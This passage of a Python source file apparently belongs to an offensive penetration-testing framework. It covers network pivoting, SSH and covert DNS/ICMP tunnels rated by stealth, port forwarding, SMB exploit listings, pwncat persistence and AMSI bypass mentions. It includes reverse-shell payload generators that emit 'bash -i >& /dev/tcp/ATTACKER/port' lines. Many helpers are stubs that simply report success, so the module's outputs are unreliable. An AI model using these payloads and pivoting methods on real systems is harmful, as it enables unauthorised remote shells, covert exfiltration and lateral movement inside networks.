            self.logger.info(f"🌐 Creating tunnels through {host}")
            
            # SSH Tunnels
            if await self._check_port(host, 22):
                ssh_tunnels = await self._create_ssh_tunnels(host, credentials)
                tunnel_analysis["available_tunnels"].extend(ssh_tunnels)
            
            # HTTP/HTTPS Tunnels
            if await self._check_port(host, 80) or await self._check_port(host, 443):
                http_tunnels = await self._create_http_tunnels(host, credentials)
                tunnel_analysis["available_tunnels"].extend(http_tunnels)
            
            # DNS Tunnels
            if await self._check_port(host, 53):
                dns_tunnels = await self._create_dns_tunnels(host, credentials)
                tunnel_analysis["available_tunnels"].extend(dns_tunnels)
            
            # ICMP Tunnels
            icmp_tunnels = await self._create_icmp_tunnels(host, credentials)
            tunnel_analysis["available_tunnels"].extend(icmp_tunnels)
            
            # Custom Protocol Tunnels
            custom_tunnels = await self._create_custom_tunnels(host, credentials)
            tunnel_analysis["available_tunnels"].extend(custom_tunnels)
            
            tunnel_types = [
                {"type": "SSH", "description": "Encrypted SSH tunnels", "stealth": "Medium"},
                {"type": "HTTP", "description": "HTTP/HTTPS tunnels", "stealth": "High"},
                {"type": "DNS", "description": "DNS exfiltration tunnels", "stealth": "Very High"},
                {"type": "ICMP", "description": "ICMP covert channels", "stealth": "Very High"},
                {"type": "Custom", "description": "Custom protocol tunnels", "stealth": "Extreme"}
            ]
            
            tunnel_analysis["tunnel_types"] = tunnel_types
            
            return tunnel_analysis
            
        except Exception as e:
            tunnel_analysis["error"] = f"Tunnel creation failed: {str(e)}"
            return tunnel_analysis
    
    async def _port_forward(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Create various port forwarding configurations."""
        port_forward_analysis = {
            "target": host,
            "local_forwards": [],
            "remote_forwards": [],
            "dynamic_forwards": [],
            "findings": []
        }
        
        try:
            self.logger.info(f"🔀 Setting up port forwarding through {host}")
            
            # Local port forwards (access remote services locally)
            local_forwards = await self._create_local_port_forwards(host, credentials)
            port_forward_analysis["local_forwards"] = local_forwards
            
            # Remote port forwards (expose local services remotely)
            remote_forwards = await self._create_remote_port_forwards(host, credentials)
            port_forward_analysis["remote_forwards"] = remote_forwards
            
            # Dynamic port forwards (SOCKS proxy)
            dynamic_forwards = await self._create_dynamic_port_forwards(host, credentials)
            port_forward_analysis["dynamic_forwards"] = dynamic_forwards
            
            # Common port forwarding scenarios
            scenarios = [
                {
                    "scenario": "Internal Service Access",
                    "description": "Forward internal web services to local ports",
                    "example": "ssh -L 8080:internal-server:80 user@pivot-host"
                },
                {
                    "scenario": "Database Access",
                    "description": "Forward internal database to local port",
                    "example": "ssh -L 3306:db-server:3306 user@pivot-host"
                },
                {
                    "scenario": "RDP Access",
                    "description": "Forward internal RDP through SSH",
                    "example": "ssh -L 3389:internal-windows:3389 user@pivot-host"
                },
                {
                    "scenario": "SOCKS Proxy",
                    "description": "Dynamic SOCKS proxy for full network access",
                    "example": "ssh -D 1080 user@pivot-host"
                }
            ]
            
            port_forward_analysis["common_scenarios"] = scenarios
            
            return port_forward_analysis
            
        except Exception as e:
            port_forward_analysis["error"] = f"Port forwarding failed: {str(e)}"
            return port_forward_analysis
    
    # Helper methods for the new functionality
    
    async def _check_smb_vulnerabilities(self, host: str) -> List[Dict[str, Any]]:
        """Check for known SMB vulnerabilities."""
        vulnerabilities = [
            {
                "cve": "CVE-2017-0144",
                "name": "EternalBlue",
                "description": "SMB RCE vulnerability",
                "severity": "Critical",
                "exploit_available": True
            },
            {
                "cve": "CVE-2020-0796", 
                "name": "SMBGhost",
                "description": "SMB compression RCE",
                "severity": "Critical",
                "exploit_available": True
            }
        ]
        return vulnerabilities
    
    async def _test_ssh_tunneling_capabilities(self, ssh_client) -> Dict[str, Any]:
        """Test SSH tunneling capabilities."""
        return {
            "local_forwarding": True,
            "remote_forwarding": True,
            "dynamic_forwarding": True,
            "agent_forwarding": True,
            "x11_forwarding": False
        }
    
    async def _create_ssh_pivot(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create SSH-based pivot methods."""
        return [
            {
                "method": "SSH Dynamic Port Forward",
                "description": "SOCKS proxy via SSH",
                "command": f"ssh -D 1080 {credentials.get('username')}@{host}"
            },
            {
                "method": "SSH Local Port Forward",
                "description": "Forward specific ports",
                "command": f"ssh -L 8080:internal:80 {credentials.get('username')}@{host}"
            }
        ]
    
    async def _create_rdp_pivot(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create RDP-based pivot methods."""
        return [
            {
                "method": "RDP Port Forward",
                "description": "Forward ports through RDP session",
                "requirements": ["RDP access", "Port forwarding tools"]
            }
        ]
    
    async def _create_winrm_pivot(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create WinRM-based pivot methods."""
        return [
            {
                "method": "PowerShell Remoting Pivot",
                "description": "Use PS remoting for pivot",
                "requirements": ["WinRM access", "PowerShell execution"]
            }
        ]
    
    async def _create_ssh_tunnels(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create SSH tunnels."""
        return [
            {
                "type": "SSH Local Forward",
                "description": "Local port forwarding via SSH",
                "stealth": "Medium",
                "bandwidth": "High"
            },
            {
                "type": "SSH Dynamic Forward", 
                "description": "SOCKS proxy via SSH",
                "stealth": "Medium",
                "bandwidth": "High"
            }
        ]
    
    async def _create_http_tunnels(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create HTTP/HTTPS tunnels."""
        return [
            {
                "type": "HTTP Tunnel",
                "description": "HTTP CONNECT method tunnel",
                "stealth": "High",
                "bandwidth": "Medium"
            },
            {
                "type": "HTTPS Tunnel",
                "description": "Encrypted HTTPS tunnel",
                "stealth": "Very High",
                "bandwidth": "Medium"
            }
        ]
    
    async def _create_dns_tunnels(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create DNS tunnels."""
        return [
            {
                "type": "DNS Tunnel",
                "description": "Data exfiltration via DNS queries",
                "stealth": "Very High",
                "bandwidth": "Very Low"
            }
        ]
    
    async def _create_icmp_tunnels(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create ICMP tunnels."""
        return [
            {
                "type": "ICMP Tunnel",
                "description": "Covert channel via ICMP packets",
                "stealth": "Very High", 
                "bandwidth": "Low"
            }
        ]
    
    async def _create_custom_tunnels(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create custom protocol tunnels."""
        return [
            {
                "type": "Custom Protocol",
                "description": "Custom application-layer tunnel",
                "stealth": "Extreme",
                "bandwidth": "Variable"
            }
        ]

    # ------------------------------------------------------------------
    # Additional helper methods
    # ------------------------------------------------------------------

    async def _alternative_powershell_execution(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Return alternative PowerShell execution techniques."""
        return [
            {
                "method": "PsExec",
                "description": "Execute PowerShell via PsExec service"
            },
            {
                "method": "WMI",
                "description": "Use WMI to launch PowerShell commands"
            },
            {
                "method": "DCOM",
                "description": "Execute PowerShell through DCOM objects"
            }
        ]

    async def _connect_to_bind_shell(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Attempt to connect to a bind shell."""
        try:
            reader, writer = await asyncio.open_connection(host, port)
            writer.close()
            await writer.wait_closed()
            return {"connected": True}
        except Exception:
            return None

    async def _create_dynamic_port_forwards(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create dynamic (SOCKS) port forwards."""
        return [
            {
                "type": "Dynamic",
                "description": "SOCKS proxy",
                "command": f"ssh -D 1080 {credentials.get('username', '')}@{host}"
            }
        ]

    async def _create_local_port_forwards(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create local port forwarding configurations."""
        return [
            {
                "type": "Local",
                "description": "Forward remote port 80 locally",
                "command": f"ssh -L 8080:{host}:80 {credentials.get('username', '')}@{host}"
            }
        ]

    async def _create_pivot_chains(self, host: str, credentials: Dict[str, str]) -> List[str]:
        """Build simple pivot chains for multi-hop access."""
        return [f"attacker -> {host} -> target"]

    async def _create_remote_port_forwards(self, host: str, credentials: Dict[str, str]) -> List[Dict[str, Any]]:
        """Create remote port forwarding configurations."""
        return [
            {
                "type": "Remote",
                "description": "Expose local port 4444 remotely",
                "command": f"ssh -R 4444:localhost:4444 {credentials.get('username', '')}@{host}"
            }
        ]

    async def _create_socks_proxy(self, info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Simulate creation of a SOCKS proxy for pivoting."""
        return {
            "proxy_type": "socks5",
            "host": info.get("host"),
            "port": 1080
        }

    async def _deploy_payload(self, host: str, payload: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Simulate payload deployment on the target host."""
        return {"success": True, "host": host}

    async def _enumerate_network_from_session(self, session: Dict[str, Any]) -> Dict[str, Any]:
        """Enumerate network information from an active session."""
        return {
            "interfaces": ["eth0"],
            "routes": ["0.0.0.0/0"]
        }

    async def _enumerate_networks_from_pivot(self, host: str, credentials: Dict[str, str]) -> List[str]:
        """Enumerate networks reachable from a pivot host."""
        return ["192.168.0.0/24"]

    async def _establish_ssh_connection(self, host: str, username: str, password: str, private_key: str) -> Optional[Any]:
        """Establish an SSH connection using paramiko if available."""
        if not PARAMIKO_AVAILABLE:
            return None
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if private_key:
                from io import StringIO
                key_file = StringIO(private_key)
                pkey = paramiko.RSAKey.from_private_key(key_file)
                client.connect(host, username=username, pkey=pkey, timeout=5)
            else:
                client.connect(host, username=username, password=password, timeout=5)
            return client
        except Exception:
            return None

    async def _establish_winrm_connection(self, host: str, username: str, password: str, domain: str) -> Optional[Any]:
        """Simulate establishing a WinRM connection."""
        return {"connected": True, "host": host}

    async def _generate_bind_shell_payload(self, port: int) -> str:
        """Generate a simple bind shell payload."""
        return f"bash -i >& /dev/tcp/ATTACKER/{port} 0>&1"

    async def _generate_reverse_shell_payload(self, host: str, port: int) -> str:
        """Generate a simple reverse shell payload."""
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

    async def _powershell_attack_techniques(self, host: str, credentials: Dict[str, str]) -> List[str]:
        """Return common PowerShell attack techniques."""
        return [
            "PowerShell downgrade attack",
            "AMSI bypass",
            "Obfuscated script execution"
        ]

    async def _pwncat_enumerate_capabilities(self, session: Dict[str, Any]) -> List[str]:
        """Enumerate capabilities available in a pwncat session."""
        return ["file_upload", "port_forward", "privilege_escalation"]

    async def _pwncat_establish_persistence(self, session: Dict[str, Any]) -> Dict[str, Any]:
        """Simulate establishing persistence via pwncat."""
        return {"method": "cron", "success": True}

    async def _start_pwncat_listener(self, port: int) -> Dict[str, Any]:
        """Simulate starting a pwncat listener."""
        return {"listening": True, "port": port}

    async def _test_powershell_remoting(self, host: str, username: str, password: str, domain: str) -> Dict[str, Any]:
        """Simulate testing PowerShell remoting capability."""
        return {
            "powershell_available": True,
            "remoting_enabled": True,
            "tested_user": username
        }
